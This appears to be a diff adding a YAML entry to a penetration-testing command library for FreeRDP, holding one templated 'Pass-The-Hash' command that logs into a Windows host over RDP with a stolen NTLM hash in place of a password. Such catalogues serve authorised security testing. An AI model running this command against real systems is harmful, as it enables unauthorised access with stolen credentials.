@@ -1,0 +1,15 @@
+---
+name: FreeRDP
+description: A free remote desktop protocol implementation
+os: Linux
+ptf_module: null
+---
+commands:
+  - "Windows Pass-The-Hash (via RDP)":
+    - type: ["bash","standalone"]
+    - text: "xfreerdp /u:{STR} /d:{STR} /pth:{STR} /v:{IPV4}"
+    - input: ["target user","domain","NTLM hash","target IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+...
